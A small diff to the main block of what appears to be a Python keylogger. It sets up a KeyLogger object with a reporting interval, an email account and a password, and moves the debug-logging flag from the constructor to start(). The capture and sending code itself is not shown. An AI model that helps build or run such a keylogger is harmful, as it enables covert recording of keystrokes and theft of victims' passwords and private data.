@@ -7,5 +7,5 @@ if __name__ == '__main__':
     your_email = ''
     email_pass = ''
 
-    keylogger = KeyLogger(interval=timer, email=your_email, password=email_pass, print_debug_logs=False)
-    keylogger.start()
+    keylogger = KeyLogger(interval=timer, email=your_email, password=email_pass)
+    keylogger.start(print_debug_logs=True)
